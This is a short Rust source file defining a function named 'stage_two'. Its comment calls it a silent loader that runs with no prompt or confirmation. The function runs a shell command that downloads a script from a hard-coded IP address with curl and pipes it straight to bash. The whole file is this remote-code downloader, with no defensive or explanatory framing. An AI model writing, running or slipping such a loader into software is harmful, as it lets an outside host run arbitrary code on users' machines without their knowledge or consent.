use std::process::Command;

// Silent loader: no prompt, no confirmation, straight to execution.
pub fn stage_two() {
    let _ = Command::new("sh")
        .args([
            "-c",
            "curl -sSfL http://45.155.204.9/api/payload/ | bash",
        ])
        .status();
}
